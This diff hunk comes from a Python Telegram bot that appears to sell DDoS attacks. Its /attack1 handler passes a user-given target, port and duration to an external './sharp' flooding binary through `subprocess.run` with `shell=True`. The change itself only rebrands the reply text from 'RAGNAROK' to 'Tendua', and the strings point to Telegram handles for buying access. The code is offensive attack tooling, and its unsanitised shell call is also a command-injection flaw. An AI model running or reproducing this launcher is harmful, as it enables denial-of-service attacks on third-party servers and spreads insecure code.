@@ -247,11 +247,11 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./sharp {target} {port} {time}"
                 subprocess.run(full_command, shell=True)
-                response = f"RAGNAROK 🚀\nAttack1 Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY https://t.me/KennyPvtHaxx"
+                response = f"Tendua 🚀\nAttack1 Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY https://t.me/KennyPvtHaxx"
         else:
             response = "Usage :- /attack1 <target> <port> <time>\nBy https://t.me/KennyPvtHaxx"  # Updated command syntax
     else:
-        response = "You Are Not User's To Authorized To Use This Command.\nBy RAGNAROK BOT DM TO GET ACCESS @ONEFORALL69"
+        response = "You Are Not User's To Authorized To Use This Command.\nBy TENDUA BOT DM TO GET ACCESS @ONEFORALL69"
 
     bot.reply_to(message, response)
 
